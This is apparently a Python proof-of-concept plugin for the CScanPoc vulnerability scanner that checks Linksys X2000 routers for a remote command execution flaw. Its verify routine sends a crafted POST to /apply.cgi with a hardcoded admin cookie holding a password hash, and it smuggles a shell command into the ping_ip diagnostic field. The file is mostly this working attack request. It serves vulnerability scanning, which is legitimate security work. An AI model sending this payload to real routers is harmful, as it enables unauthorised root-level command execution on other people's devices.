# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'Linksys_0001' # 平台漏洞编号，留空
    name = 'Linksys X2000 Command Execution'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE # 漏洞类型
    disclosure_date = '2015-11-03'  # 漏洞公布时间
    desc = '''
        The Linksys X2000 suffers from a remote, unauthenticated command execution vulnerability that scores root privileges.
    '''  # 漏洞描述
    ref = 'https://packetstormsecurity.com/files/134190/Linksys-X2000-Command-Execution.html'  # 漏洞来源
    cnvd_id = ''  # cnvd漏洞编号
    cve_id = ''  # cve编号
    product = 'Linksys'  # 漏洞应用名称
    product_version = 'X2000'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '42e4fb99-4f1d-47fe-bc7d-e9f3268b4e2a'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-18'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            hh = hackhttp.hackhttp()
            data = 'submit_button=Diagnostics&change_action=gozila_cgi&submit_type=start_ping&action=&commit=0&nowait=1&ping_size=32&ping_times=5&ping_ip=ls'
            url = self.target + '/apply.cgi'
            code, head, res, errcode, _ = hh.http(url, data, Cookie= 'wys_userid=admin,wys_passwd=5982861B34B74E9A6DAD66A9895CDFFF')

            if 'X2000'  in res and 'You must input an IP Address or Domain Name' in res:
                #security_hole('Linksys X2000 Command Execution AND Unauthorized access!')
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
